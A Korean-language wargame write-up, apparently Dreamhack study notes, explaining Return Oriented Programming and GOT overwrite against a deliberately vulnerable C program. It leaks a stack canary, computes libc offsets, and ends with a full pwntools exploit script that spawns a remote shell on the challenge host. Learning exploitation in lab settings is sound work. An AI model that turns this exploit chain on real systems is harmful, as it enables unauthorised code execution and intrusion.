바로 이전 문제인 **rtl(return to library)** 문제에서는 `system@plt`를 사용자가 임의로 등록해주었고, `/bin/sh` 문자열도 사용자가 임의로 등록해주었기 때문에, NX에도 불구하고 익스플로잇이 상당히 수월했다.  

하지만, 일반적으로 `system` 함수를 실제 바이너리에 포함시키는 것은 보안상으로 대부분의 상황에서는 제한되기 때문에 실제로 바이너리에 사용자가 등록한 `system@plt`를 이용하는 공격은 현실에서 거의 불가능하다.  

따라서 현실적으로, ASLR이 적용된 상황에서 `system` 함수를 사용하기 위해서는,    
1. 프로세스에서 `libc` 라이브러리가 무작위로 매핑된 주소를 찾고, 
2. `system`함수와 같은 ***사용하고자 하는 심볼의 `오프셋`*** 을 이용하여 함수의 주소를 계산해야 한다.

여러 리턴 가젯을 이용하는 **ROP**와 **GOT Overwrite** 기법을 통해 어떻게 이런 공격을 이룰 수 있는지 알아보고 실제로 이용해보자.

# ROP : Return Oriented Programming

`ROP`는 리턴 가젯을 사용하여 복잡한 실행 흐름을 구현하는 기법이다. 공격자는 이를 이용하여 문제 상황에 따라, `return to library`, `return to dl-resolve`, `GOT overwrite` 등 여러 기법으로 페이로드를 구성할 수 있다.

지난 rtl 문제에서는 `system@plt`를 통해 return to library 기법을 사용하여 문제를 해결하였었다.

이번 `rop.c` 문제에서는 여러 `ret` 단위로 구성된 ROP를 이용한 `GOT Overwrite`를 활용하여 문제를 해결하여 보겠다. 아래는 소스 코드이다.
```
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  write(1, "Buf: ", 5);
  read(0, buf, 0x100);

  return 0;
}
```

## 문제 풀이 방법

먼저, 해당 문제는 카나리가 적용되어 있기 때문에, 카나리를 우회하고, `system('/bin/sh')`을 실행하기 위해 `libc` 라이브러리의 `system`함수를 이용할 것이다. 

여기서 `system`함수의 plt는 바이너리에서 사용한 적이 없기 때문에 등록되어 있지 않다. 따라서, 바이너리에서 사용한 `read`, `puts`, `write` 함수의 GOT를 `system` 함수의 GOT 주소로 조작해서 해당 plt를 호출하여 `system`함수를 실행할 수 있다. ASLR에 의해 `libc` 라이브러리의 주소가 무작위로 매핑되기 때문에 각 함수의 **오프셋**을 통해 GOT를 Overwrite할 것이다. 

또한 `/bin/sh` 문자열을 `libc`에서 찾는 경우의 수도 존재하지만, 여기서는 `buf`에 직접 `/bin/sh` 문자열을 입력할 수 있기 때문에, 해당 문자열을 직접 입력함으로써 해결할 수 있다. 

<img width="735" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/2ae1e208-565e-4fb1-904d-d925cb5d036a">

`libc`에서 `bin/sh`의 주소를 찾으려면 오프셋을 또 계산해야하기 때문에 복잡하기 때문이다.

### 참고 : 💡 Ubuntu 22.04 환경에서 실습 소스 코드를 동일한 옵션으로 컴파일했는데도 ROP 가젯이 없습니다.

Ubuntu 22.04에 탑재된 Glibc의 버전이 2.34 이상이기 때문입니다.

Glibc 2.34 이전 버전에서 컴파일된 바이너리를 실행하면, main()을 호출하기에 앞서 프로그램을 초기화하는 과정에서 __libc_csu_init()이 호출됩니다. __libc_csu_init()은 Glibc 안에 존재하는 함수로, 프로그램을 컴파일할 때 정적으로 링킹되며 ROP 공격에 유용한 가젯을 가지고 있습니다. 따라서 해당 함수는 보안상의 이유로 Glibc 2.34 버전부터 삭제되었습니다.

본 강의에서는 실습 편의상 Glibc 2.34 이전 환경에서 컴파일하여 __libc_csu_init() 함수가 포함된 바이너리를 사용합니다. 워게임에서 첨부파일로 제공되는 바이너리를 사용하여 실습해보세요!

## 1. 카나리 우회

<img width="965" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/31831586-e83b-4a05-82b3-d90d544da675">

해당 스크린샷에서 buf의 위치는 `rbp-0x40`, 카나리의 위치는 `rbp-0x8`이라는 것을 알 수 있다. 따라서, 카나리를 우회하기 위해 `b'a'*0x39`를 첫번째 페이로드에 담아 전달하여 카나리를 구할 수 있다.

## 2. `system` 함수의 주소 계산

`system` 함수는 `libc.so.6`에 정의되어 있으며, 해당 라이브러리에는 이 바이너리가 호출하는 `read`, `puts`, `printf`도 정의되어 있다. 라이브러리 파일은 메모리에 매핑될 때 전체가 매핑되므로, 다른 함수들과 함께 `system` 함수도 프로세스 메모리에 같이 매핑된다.

바이너리에 `system` 함수가 포함되어 있지 않기 때문에, `system` 함수가 `GOT`에 등록되지는 않지만, 대표적으로 `read` 함수는 GOT에 등록된다. 따라서, `main` 함수에서 `read`를 호출한 이후 해당 함수의 GOT를 읽을 수 있다면, `libc.so.6`이 매핑된 영역의 주소를 알 수 있다.

`read`를 호출한 이후에는 해당 GOT에 메모리에 무작위로 매핑된 `libc` 라이브러리에서 `read`의 고정된 offset만큼 떨어진 거리를 알 수 있기 때문에 `libc`의 베이스 주소를 알 수 있게 되기 때문이다. 참고로, libc 버전은 여러개지만 같은 버전 내에서는 오프셋이 고정되어있다.

예를 들어, Ubuntu GLIBC 2.35-0ubuntu3.1에서 `read` 함수와 `system` 함수 사이의 거리는 항상 `0xc3c20`이다.   
따라서 `read` 함수의 주소를 알 때, `system = read - 0xc3c20`으로 `system` 함수의 주소를 구할 수 있다.  
`libc` 파일이 있으면 다음과 같이 `readelf` 명령어로 함수의 오프셋을 구할 수 있다.

```
$ readelf -s libc.so.6 | grep " read@"
   289: 0000000000114980   157 FUNC    GLOBAL DEFAULT   15 read@@GLIBC_2.2.5
$ readelf -s libc.so.6 | grep " system@"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

`read` 함수의 오프셋은 `0x114980` 이고, `system` 함수의 오프셋은 `0x50d60`이므로 둘을 빼면, `0xc3c20`이 나오게 된다.  
따라서, `read` 함수가 resolve된 이후 GOT 주소를 알 때, 해당 함수의 주소에서 `0xc3c20`을 뺴면, `system`함수의 주소도 알 수 있다.

## 3. "/bin/sh"

해당 바이너리의 데이터 영역에는 `/bin/sh` 문자열을 사용한 적이 없으므로 존재하지 않는다. 따라서, 이 문자열을 임의의 버퍼에 직접 주입해서 사용하거나 다른 파일에 포함된 것을 사용해야 한다.

후자의 경우를 택할 때 가장 많이 사용되는 파일이 `libc.so.6`에 포함된 `/bin/sh` 문자열이다. 이 문자열의 주소 또한 `system` 함수를 구할 때 처럼 `offset`을 이용하여 구할 수 있다.

<img width="735" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/2ae1e208-565e-4fb1-904d-d925cb5d036a">

우리는 해당 문제에서 `buf`에 직접 `/bin/sh` 문자열을 주입할 수 있기 때문에 전자의 방법을 사용하겠다.

## 4. GOT Overwrite

`system` 함수와 "/bin/sh" 문자열의 주소를 알고 있으므로, 지난 코스에서처럼 `pop rdi; ret` 가젯을 활용하여 `system(“/bin/sh”)`를 호출할 수 있다. 

그러나 `system` 함수의 주소를 알았을 때는 이미 ROP 페이로드가 전송된 이후이므로, 알아낸 `system` 함수의 주소를 페이로드에 사용하려면 `main`함수로 돌아가서 다시 버퍼 오버플로우를 일으켜야 한다. 이러한 공격 패턴을 `ret2main`이라고 부르는데, 이 코스에서는 GOT Overwrite 기법을 통해 한 번에 셸을 획득할 것이다.

**Background: Library - Dynamic Link VS. Static Link** 코스에서 ***Lazy binding***에 대해 배운 내용을 정리해보면 다음과 같다.

1. 호출할 라이브러리 함수의 주소를 프로세스에 매핑된 라이브러리에서 찾는다.

2. 찾은 주소를 GOT에 적고, 이를 호출한다.

3. **해당 함수를 다시 호출할 경우, GOT에 적힌 주소를 그대로 참조한다.**

위 과정에서 GOT Overwrite에 이용되는 부분은 3번이다. GOT에 적힌 주소를 검증하지 않고 참조하므로 GOT에 적힌 주소를 변조할 수 있다면, 해당 함수가 재호출될 때 공격자가 원하는 코드가 실행되게 할 수 있다.

알아낸 `system` 함수의 주소를 어떤 함수의 GOT에 쓰고, 그 함수를 **재호출하도록** ROP 체인을 구성하면 될 것이다.

## 익스플로잇 코드 구성

```
from pwn import *

context.arch = "amd64"
p = remote('host3.dreamhack.games', 15132)

e = ELF('./rop')
libc = ELF('./libc.so.6')

# Leak canary

payload = b'a'*0x38
p.sendafter(b'Buf: ', payload+b'a')
p.recvuntil(payload + b'a')
canary = b'\x00' + p.recvn(7)

# Exploit

read_plt = e.plt['read']       # read_plt = e.symbols['read']와 같음
read_got = e.got['read']       # 여기서는 got 주소만 알 수 있고 got 주소 안의 내용은 알 수 없음
write_plt = e.plt['write']
read_system_offset = libc.symbols['read'] - libc.symbols['system']

pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload += canary + b'a'*0x8
payload += p64(ret)            # movaps 때문에 stack을 0x10 단위로 맞추기 위해 삽입

# write(1, read_got, ...)

payload += p64(pop_rdi) + p64(0x1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# read(0, read_got, ...)

payload += p64(pop_rdi) + p64(0x0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0x0)
payload += p64(read_plt)

# read('/bin/sh') == system('/bin/sh')

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)

read = p.recvn(8)
system = u64(read) - read_system_offset

# read = p.recv(6)
# system = u64(read + b'\x00\x00') - read_system_offset

p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
```

## GOT Overwrite 및 "/bin/sh" 입력 과정 참고 설명

"/bin/sh"은 덮어쓸 GOT 엔트리의 바로 뒤 메모리 주소에 위치시키도록 GOT엔트리 뒤에 같이 입력하면 된다. 이 바이너리에서 입력을 위해 `read` 함수를 사용하는데, 해당 함수는 `rdi, rsi, rdx` 세 개의 인자를 사용한다.

앞의 두 인자는 `pop rdi; ret`과 `pop rsi; pop r15; ret` 가젯으로 쉽게 설정할 수 있지만, `pop rdx`와 관련된 가젯은 일반적인 바이너리에서 거의 찾기 힘들다. (`pop r15`는 `pop rsi`를 위해 어쩔 수 없이 붙어있는 가젯으로 `r15`에는 그냥 0을 대입하도록 세팅해줌)

이럴 때는 `libc`의 코드 가젯이나 `libc_csu_init` 가젯을 사용하여 문제를 해결할 수 있다. 또는 `rdx` 값을 변화시키기 위해 다른 함수를 간접적으로 호출해서 값을 설정할 수도 있는데,   
예를 들어 `strncmp` 함수는 `rax`로 비교의 결과를 반환하고, `rdx`로 두 문자열의 첫 번째 문자부터 가장 긴 부분 문자열의 길이를 반환한다. 여기에 간접적으로, `rdx`에 넣기 원하는 값을 대입해서 사용할 수도 있다.

해당 문제에서는 `read` 함수의 GOT를 읽은 뒤 `rdx`에 어느정도 큰 값이 설정되어 있기 때문에, 따로 `rdx` 값을 설정하는 가젯을 추가하지 않았지만, 좀 더 reliable한 익스플로잇을 위해서는 가젯을 추가해주는 것이 좋다.

***해당 문제의 전체 익스플로잇 과정을 정리해보면,***

1. 카나리 우회

2. `write(1, read_got, ...)`을 통해 resolve된 `read` 함수의 got 값을 출력하기.

3. 출력한 `read_got` 값과 `libc`의 `system`함수와의 오프셋을 이용하여 `system_got` 값을 구하기

4. `read(0, read_got, ...)`을 통해서 앞에서 구한 `system_got`값과 바로 연속적으로 `/bin/sh` 문자열을 `read` 함수의 `STDIN(fd = 0)` 입력으로 보내서 `read_got`를 **Overwrite**하기

5. `read('/bin/sh')`을 실행하도록 하면, 앞에서 Overwrite된 과정에 의해 `system('/bin/sh')`가 실행되므로 `rdi`에는 `read_got+0x8`의 주소를 대입하고, `ret` 가젯으로 `read_plt`를 호출하도록 하여 익스플로잇 완료하기

<img width="536" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/4cb122c9-2905-48a5-bf6a-3335c53c839b">
<img width="537" alt="image" src="https://github.com/juhyeongkim527/Dreamhack-Study/assets/138116436/d51a5160-7c4f-4a10-85c4-ba4fc5ce7288">


